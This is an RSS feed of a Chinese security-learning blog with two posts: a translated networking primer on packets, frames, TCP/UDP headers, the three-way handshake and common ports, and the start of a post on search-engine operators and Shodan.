<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>web基础 on 夜路归</title>
        <link>https://Yerucrem.github.io/categories/web%E5%9F%BA%E7%A1%80/</link>
        <description>Recent content in web基础 on 夜路归</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Yerucrem</copyright>
        <lastBuildDate>Mon, 24 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/categories/web%E5%9F%BA%E7%A1%80/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>数据包和帧</title>
        <link>https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-9239059_1280.jpg" alt="Featured image of post 数据包和帧" /&gt;&lt;h1 id=&#34;数据包和帧&#34;&gt;数据包和帧
&lt;/h1&gt;&lt;h2 id=&#34;什么是数据包和帧&#34;&gt;什么是数据包和帧
&lt;/h2&gt;&lt;p&gt;数据包和帧是小块数据，当它们组合在一起时，会形成较大的信息或消息。但是，它们在 OSI 模型中是两个不同的东西。帧位于第 2 层 - 数据链路层，这意味着没有 IP 地址等信息。将此视为将信封放入信封中并将其寄走。第一个信封将是您邮寄的数据包，但一旦打开，其中的信封仍然存在并包含数据（这是一个帧）。&lt;/p&gt;
&lt;p&gt;这个过程称为封装，我们在 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/osimodelzi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;3 号房间中讨论过：OSI 模型 &lt;/a&gt;。在这个阶段，可以安全地假设当我们谈论任何 IP 地址时，我们谈论的是数据包。当封装信息被剥离时，我们谈论的是框架本身。&lt;/p&gt;
&lt;p&gt;数据包是在联网设备之间传输数据的一种有效方式，例如任务 1 中介绍的设备。由于这些数据是小块交换的，因此与一次发送大消息相比，整个网络中出现瓶颈的可能性更小。&lt;/p&gt;
&lt;p&gt;例如，从网站加载图像时，此图像不会作为一个整体发送到您的计算机，而是在您的计算机上重建的小块。以下图为例来说明这个过程。猫咪的照片被分成三个包，到达计算机后被重建，形成最终的图像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092004403.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092004403&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;数据包具有不同的结构，具体取决于要发送的数据包的类型。正如我们接下来将要讨论的那样，网络充满了标准和协议，它们充当了一组规则，用于定义如何在设备上处理数据包。互联网上连接了数十亿台设备，如果没有标准化，事情可能会很快崩溃。&lt;/p&gt;
&lt;p&gt;让我们继续我们的 Internet 协议示例。使用此协议的数据包将具有一组标头，其中包含通过网络发送的数据的附加信息。&lt;/p&gt;
&lt;p&gt;一些值得注意的标头包括：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Header 页眉&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Description 描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Time to Live&lt;/td&gt;
          &lt;td&gt;此字段为数据包设置一个到期计时器，如果它从未设法到达主机或逃逸，则不会阻塞您的网络！&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Checksum&lt;/td&gt;
          &lt;td&gt;此字段为 TCP/IP 等协议提供完整性检查。如果更改了任何数据，此值将与预期值不同，因此会损坏。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Address&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;发送 数据包&lt;/strong&gt;的设备的 IP 地址，以便数据知道要&lt;strong&gt;返回到&lt;/strong&gt;何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Address&lt;/td&gt;
          &lt;td&gt;数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;tcpip-三次握手&#34;&gt;TCP/IP 三次握手
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;TCP&lt;/strong&gt; （或 简称 &lt;strong&gt;T&lt;/strong&gt;ransmission &lt;strong&gt;C&lt;/strong&gt;ontrol &lt;strong&gt;P&lt;/strong&gt;rotocol）是网络中使用的另一种规则。&lt;/p&gt;
&lt;p&gt;到目前为止，该协议与我们之前在本模块的 3 号房间中讨论的 OSI 模型非常相似。TCP/IP 协议由四层组成，可以说只是 OSI 模型的概括版本。这些层是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application 应用&lt;/li&gt;
&lt;li&gt;Transport 运输&lt;/li&gt;
&lt;li&gt;Internet 互联网&lt;/li&gt;
&lt;li&gt;Network Interface 网络接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;与 OSI 模型的工作方式非常相似，当数据（或数据包）遍历 TCP 模型时，信息会添加到 TCP 模型的每一层。您可能还记得，这个过程被称为 encapsulation - 这个过程的反面是 decapsulation。&lt;/p&gt;
&lt;p&gt;TCP 的一个定义特征是它是 &lt;strong&gt;基于连接的&lt;/strong&gt; ，这意味着 TCP 必须在发送数据之前在客户端和充当服务器的 设备之间建立连接 。&lt;/p&gt;
&lt;p&gt;因此，TCP 保证发送的任何数据都将在另一端接收。这个过程被称为 三次握手，我们稍后会讨论。 下表比较了 TCP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;TCP 的优点&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;TCP 的缺点&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;保证数据的完整性。&lt;/td&gt;
          &lt;td&gt;需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块，必须重新发送。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;能够同步两个设备，以防止彼此以错误的顺序被数据淹没。&lt;/td&gt;
          &lt;td&gt;慢速连接可能会使另一台设备成为瓶颈，因为该连接将始终保留在另一台设备上。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;执行更多的流程以实现可靠性&lt;/td&gt;
          &lt;td&gt;TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多的工作 （计算）。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TCP 数据包包含从封装添加的称为报头的信息的各个部分。让我们解释下表中的一些关键标头：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Header 页眉&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Description 描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Port 源端口&lt;/td&gt;
          &lt;td&gt;此值是发送方打开的用于发送 TCP 数据包的端口。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Port 目标端口&lt;/td&gt;
          &lt;td&gt;此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source IP 源 IP&lt;/td&gt;
          &lt;td&gt;这是发送数据包的设备的 IP 地址。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination IP 目标 IP&lt;/td&gt;
          &lt;td&gt;这是数据包的目标设备的 IP 地址。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Sequence Number 序列号&lt;/td&gt;
          &lt;td&gt;当连接发生时，传输的第一条数据被赋予一个随机数。我们将在后面更深入地解释这一点。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Acknowledgement Number 鸣谢编号&lt;/td&gt;
          &lt;td&gt;为一条数据指定序列号后，下一条数据的编号将具有序列号 + 1。我们还将进一步更深入地解释这一点。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Checksum 校验和&lt;/td&gt;
          &lt;td&gt;此值提供 TCP 完整性。在记住输出的地方进行数学计算。当接收设备执行数学计算时，如果输出与发送的内容不同，则数据必须损坏。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Data 数据&lt;/td&gt;
          &lt;td&gt;此标头是存储数据（即正在传输的文件的字节）的位置。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Flag 旗&lt;/td&gt;
          &lt;td&gt;此标头确定任一设备在握手过程中应如何处理数据包。特定的标志将决定特定的行为，这就是我们将在下面解释的内容。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来，我们将继续讨论&lt;em&gt;三方握手 -&lt;/em&gt; 该术语用于在两个设备之间建立连接的过程。 三方握手使用一些特殊消息进行通信 - 下表突出显示了主要消息：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;步骤&lt;/th&gt;
          &lt;th&gt;消息&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;SYN&lt;/td&gt;
          &lt;td&gt;SYN 消息是客户端在握手期间发送的初始数据包。此数据包用于启动连接并将两个设备同步在一起（我们稍后将进一步解释）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;SYN/ACK&lt;/td&gt;
          &lt;td&gt;此数据包由接收设备（服务器）发送，以确认来自客户端的同步尝试。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;ACK&lt;/td&gt;
          &lt;td&gt;The acknowledgement packet can be used by either the client or server to acknowledge that a series of messages/packets have been successfully received. 客户端或服务器可以使用确认数据包来确认已成功接收一系列消息/数据包。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;DATA&lt;/td&gt;
          &lt;td&gt;建立连接后，数据（例如文件的字节）将通过 “DATA” 消息发送。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;FIN&lt;/td&gt;
          &lt;td&gt;此数据包用于在连接完成后&lt;em&gt;干净（正确）&lt;/em&gt; 关闭连接。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#&lt;/td&gt;
          &lt;td&gt;RST&lt;/td&gt;
          &lt;td&gt;此数据包会突然结束所有通信。这是最后的手段，表明在此过程中存在一些问题。例如，如果服务或应用程序无法正常工作，或者系统存在资源不足等故障。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下图显示了 Alice 和 Bob 之间的正常 Three-way 握手过程。在现实生活中，这将是在两个设备之间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092315229.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092315229&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;任何发送的数据都会被赋予一个随机数字序列，并使用此数字序列并以 1 为增量进行重建。两台计算机必须就相同的编号规则达成一致，才能以正确的顺序发送数据。此顺序分三个步骤达成一致：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SYN - 客户端：这是我的初始序列号 （ISN），用于 &lt;strong&gt;SYN&lt;/strong&gt;chronise （0）&lt;/li&gt;
&lt;li&gt;SYN/ACK - 服务器：这是我用 （5,000） 记录 &lt;strong&gt;SYN&lt;/strong&gt; 的初始序列号 （ISN），我&lt;strong&gt;现在确认&lt;/strong&gt;您的初始编号序列 （0）&lt;/li&gt;
&lt;li&gt;ACK - 客户端：我&lt;strong&gt;确认&lt;/strong&gt;您的初始序列号 （ISN） 为 （5,000），下面是我的 ISN+1 （0 + 1） 的一些数据&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Device&lt;/th&gt;
          &lt;th&gt;初始编号序列 （ISN）&lt;/th&gt;
          &lt;th&gt;最终编号序列&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;0 + 1 = 1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;1 + 1 = 2&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;2 + 1 = 3&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;TCP 协议关闭连接：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让我们快速解释一下 TCP 关闭连接背后的过程。首先， 一旦设备确定另一台设备已成功接收所有数据，TCP 将关闭连接。&lt;/p&gt;
&lt;p&gt;由于 TCP 会在设备上保留系统资源，因此最佳做法是尽快关闭 TCP 连接。&lt;/p&gt;
&lt;p&gt;要启动关闭 TCP 连接，设备将向另一台设备发送 “FIN” 数据包。当然，使用 TCP 时，另一台设备也必须确认此数据包。&lt;/p&gt;
&lt;p&gt;让我们像以前一样使用 Alice 和 Bob 来演示这个过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092456294.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092456294&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在图中，我们可以看到 Alice 向 Bob 发送了一个 “&lt;strong&gt;FIN&lt;/strong&gt;” 数据包。因为 Bob 收到了这个，所以他会让 Alice 知道他收到了这个，并且他还想关闭连接（使用 FIN）。Alice 已经清楚地听到了 Bob 的声音，并会让 Bob 知道她承认了这一点。&lt;/p&gt;
&lt;h2 id=&#34;udpip-协议&#34;&gt;UDP/IP 协议
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;U&lt;/strong&gt;ser &lt;strong&gt;D&lt;/strong&gt;atagram &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;UDP&lt;/strong&gt;） 是另一种用于在设备之间传输数据的协议。&lt;/p&gt;
&lt;p&gt;与其兄弟 TCP 不同，UDP 是一种 &lt;strong&gt;无 状态&lt;/strong&gt;协议，不需要两个设备之间持续连接即可发送数据。例如，不会发生 Three-way hand shake，两个设备之间也没有任何同步。&lt;/p&gt;
&lt;p&gt;回想一下 3 号房间中对这两个协议所做的一些比较：“OSI 模型”。也就是说，UDP 用于应用程序可以容忍数据丢失的情况（例如视频流或语音聊天）或不稳定的连接不是最终结果的情况。下表比较了 UDP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的优势&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的缺点&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 比 TCP 快得多。&lt;/td&gt;
          &lt;td&gt;UDP 不关心数据是否被接收。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 让应用程序（用户软件）决定是否可以控制数据包的发送速度。&lt;/td&gt;
          &lt;td&gt;从这个意义上说，它对软件开发人员来说是相当灵活的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 不会像 TCP 那样在设备上保留连续连接。&lt;/td&gt;
          &lt;td&gt;这意味着不稳定的连接会给用户带来糟糕的体验。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如前所述，在两个设备之间建立连接时不会发生任何过程。这意味着不考虑是否接收数据，也没有像 TCP 提供的保护措施，例如数据完整性。&lt;/p&gt;
&lt;p&gt;UDP 数据包比 TCP 数据包简单得多，并且标头更少。但是，这两种协议共享一些标准标头，下表中对此进行了注释：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header 页眉&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Time to Live (TTL) 生存时间 （TTL）&lt;/td&gt;
          &lt;td&gt;此字段为数据包设置到期计时器，因此如果数据包从未成功到达主机或逃逸，它不会阻塞您的网络！&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Address 源地址&lt;/td&gt;
          &lt;td&gt;发送数据包的设备的 IP 地址，以便数据知道要返回到何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Address 目标地址&lt;/td&gt;
          &lt;td&gt;数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Port 源端口&lt;/td&gt;
          &lt;td&gt;此值是发送方打开的端口，用于发送 UDP 数据包。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Port 目标端口&lt;/td&gt;
          &lt;td&gt;此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Data 数据&lt;/td&gt;
          &lt;td&gt;此标头是存储数据（即正在传输的文件的字节）的位置。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来，我们将继续讨论通过 UDP 进行连接的过程与 TCP 等过程有何不同。 我们应该记住 UDP 是&lt;strong&gt;无状态&lt;/strong&gt;的。连接期间不会发送确认。&lt;/p&gt;
&lt;p&gt;下图显示了 Alice 和 Bob 之间的正常 UDP 连接。在现实生活中，这将是在两个设备之间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092646004.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092646004&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;端口&#34;&gt;端口
&lt;/h2&gt;&lt;p&gt;也许正如他们的名字一样，端口是可以交换数据的重要点。想想港口和港口。希望停靠港口的船舶必须前往与船上的尺寸和设施相适应的港口。当船只排队时，它将连接到港口的港口 。例如，邮轮不能停靠在为渔船建造的港口，反之亦然。&lt;/p&gt;
&lt;p&gt;这些端口强制规定了什么可以停放以及停在哪里——如果不兼容，它就不能停在这里。网络设备在相互通信时也使用端口来执行严格的规则。建立连接后（从 OSI 模型的房间调用），设备发送或接收的任何数据都将通过这些端口发送。在计算中，端口是介于 0 和 65535 （65,535） 之间的 数值 。&lt;/p&gt;
&lt;p&gt;由于端口的范围可以在 0 到 65535 之间的任何位置，因此很快就会忘记哪个应用程序正在使用哪个端口。繁忙的港口一片混乱！值得庆幸的是，我们将应用程序、软件和行为与一组标准规则相关联。例如，通过强制通过端口 80 发送任何 Web 浏览器数据，软件开发人员可以设计一个 Web 浏览器（如 Google Chrome 或 Firefox）来以相同的方式解释数据。&lt;/p&gt;
&lt;p&gt;这意味着所有 Web 浏览器现在都共享一个通用规则：数据通过端口 80 发送。浏览器的外观、感觉和易用性取决于设计师或用户的决定。&lt;/p&gt;
&lt;p&gt;虽然 Web 数据的标准规则是 &lt;em&gt;端口 80&lt;/em&gt;，但已为其他一些协议分配了标准规则。介于 0 和 1024 （1,024） 之间的 任何端口都称为公共端口。  让我们在下面探索一些其他协议：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Protocol 协议&lt;/th&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;F&lt;/strong&gt;ile &lt;strong&gt;T&lt;/strong&gt;ransfer &lt;strong&gt;P&lt;/strong&gt;rotocol (&lt;strong&gt;FTP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;21&lt;/td&gt;
          &lt;td&gt;此协议由基于客户端-服务器模型构建的文件共享应用程序使用，这意味着您可以从中心位置下载文件。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;S&lt;/strong&gt;ecure &lt;strong&gt;Sh&lt;/strong&gt;ell (&lt;strong&gt;SSH&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;22&lt;/td&gt;
          &lt;td&gt;该协议用于通过基于文本的界面安全地登录系统以进行管理。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;H&lt;/strong&gt;yper&lt;strong&gt;T&lt;/strong&gt;ext Transfer Protocol (&lt;strong&gt;HTTP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;80&lt;/td&gt;
          &lt;td&gt;该协议为万维网 （WWW） 提供支持！您的浏览器使用它来下载网页的文本、图像和视频。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;H&lt;/strong&gt;yper&lt;strong&gt;T&lt;/strong&gt;ext &lt;strong&gt;T&lt;/strong&gt;ransfer &lt;strong&gt;P&lt;/strong&gt;rotocol &lt;strong&gt;S&lt;/strong&gt;ecure (&lt;strong&gt;HTTPS&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;443&lt;/td&gt;
          &lt;td&gt;该协议的作用与上述完全相同;但是，安全地使用加密。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;S&lt;/strong&gt;erver &lt;strong&gt;M&lt;/strong&gt;essage &lt;strong&gt;B&lt;/strong&gt;lock (&lt;strong&gt;SMB&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;445&lt;/td&gt;
          &lt;td&gt;此协议类似于文件传输协议 （FTP）;但是，除了文件之外，SMB 还允许您共享打印机等设备。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;R&lt;/strong&gt;emote &lt;strong&gt;D&lt;/strong&gt;esktop &lt;strong&gt;P&lt;/strong&gt;rotocol (&lt;strong&gt;RDP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;3389&lt;/td&gt;
          &lt;td&gt;此协议是一种使用可视化桌面界面登录系统的安全方法（与 SSH 协议的基于文本的限制相反）。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;我们只简要介绍了网络安全中更常见的协议。有关更多信息，您可以找到&lt;a class=&#34;link&#34; href=&#34;http://www.vmaxx.net/techinfo/ports.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;列出的 1024 个常用端口的表 &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;这里值得注意的是，这些协议只遵循标准。即，您可以在标准端口以外的其他端口（在 8080 而不是 80 标准端口上运行 Web 服务器）上管理与这些协议交互的应用程序。但请注意，应用程序将假定遵循标准，因此您必须提供&lt;strong&gt;冒号 （:)&lt;/strong&gt; 以及端口号。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搜索技巧</title>
        <link>https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-9438277.jpg" alt="Featured image of post 搜索技巧" /&gt;&lt;h1 id=&#34;搜索技巧&#34;&gt;搜索技巧
&lt;/h1&gt;&lt;h2 id=&#34;搜索引擎&#34;&gt;搜索引擎
&lt;/h2&gt;&lt;p&gt;我们每个人都使用过互联网搜索引擎;但是，并不是每个人都尝试利用 Internet 搜索引擎的全部功能。几乎每个 Internet 搜索引擎都允许您进行高级搜索。请考虑以下示例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.google.com/advanced_search&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google 谷歌&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/en-us/topic/advanced-search-options-b92e25f1-0085-4271-bdf9-14aaea720930&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Bing 必应&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://duckduckgo.com/duckduckgo-help-pages/results/syntax/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DuckDuckGo 鸭鸭 Go&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们考虑一下 Google 支持的搜索运算符。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;exact phrase&amp;quot;&lt;/code&gt;：双引号表示您正在查找包含确切单词或短语的页面。例如，人们可能会搜索 &lt;code&gt;“passive reconnaissance”&lt;/code&gt; 来获取包含此确切短语的页面。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;site:&lt;/code&gt;： 此运算符允许您指定要将搜索限制到的域名。例如，我们可以使用 在 TryHackMe 上搜索 &lt;code&gt;site:tryhackme.com success stories&lt;/code&gt; 成功案例。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;：减号允许您省略包含特定单词或短语的搜索结果。例如，您可能对了解金字塔感兴趣，但不想查看旅游网站;一种方法是搜索 &lt;code&gt;pyramids -tourism&lt;/code&gt; 或 &lt;code&gt;-tourism pyramids&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;filetype:&lt;/code&gt;： 此搜索运算符对于查找文件而不是网页是必不可少的。您可以使用 Google 搜索的一些文件类型是可移植文档格式 （PDF）、Microsoft Word 文档 （DOC）、Microsoft Excel 电子表格 （XLS） 和 Microsoft PowerPoint 演示文稿 （PPT）。例如，要查找网络安全演示文稿，请尝试搜索 &lt;code&gt;filetype：ppt cyber security&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;您可以在此&lt;a class=&#34;link&#34; href=&#34;https://github.com/cipher387/Advanced-search-operators-list&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;高级搜索运算符列表中&lt;/a&gt;查看各种搜索引擎中的更高级控件;但是，以上提供了一个很好的起点。检查您最喜欢的搜索引擎，了解支持的搜索运算符。&lt;/p&gt;
&lt;h2 id=&#34;专业搜索引擎&#34;&gt;专业搜索引擎
&lt;/h2&gt;&lt;p&gt;您熟悉 Internet 搜索引擎;但是，您对专业搜索引擎熟悉多少？我们指的是用于查找特定类型结果的搜索引擎。&lt;/p&gt;
&lt;h3 id=&#34;shodan&#34;&gt;Shodan
&lt;/h3&gt;&lt;p&gt;让我们从 &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
